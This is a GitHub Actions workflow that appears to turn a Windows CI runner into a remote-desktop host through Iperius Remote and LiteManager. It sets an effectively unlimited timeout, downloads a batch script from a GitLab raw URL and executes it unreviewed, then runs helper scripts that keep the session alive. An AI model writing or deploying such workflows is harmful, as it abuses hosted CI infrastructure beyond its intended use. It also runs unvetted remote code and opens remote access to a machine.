name: Windows - Iperius Remote

on:
  workflow_dispatch:

jobs:
  build:
    name: Start Building...
    runs-on: windows-latest
    timeout-minutes: 9999999
    
    steps:
      - name: Downloading & Installing Essentials
        run: |
          Invoke-WebRequest -Uri "https://gitlab.com/chamod12/iperius_win-10_github_rdp/-/raw/main/down.bat" -OutFile "Downloads.bat"
          cmd /c Downloads.bat

      - name: Connect to LiteManager
        run: cmd /c show.bat

      - name: Time Counter
        run: cmd /c loop.bat
